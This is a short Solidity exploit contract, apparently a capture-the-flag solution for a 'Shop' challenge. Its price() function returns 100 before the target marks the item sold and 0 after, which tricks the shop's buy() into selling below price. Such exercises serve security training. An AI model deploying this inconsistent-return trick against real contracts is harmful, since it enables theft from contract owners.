// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import './Shop.sol';

contract ShopHack {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns(uint) {
        return !shop.isSold() ? 100 : 0;
    }

    function attack() external {
        shop.buy();
    }
}
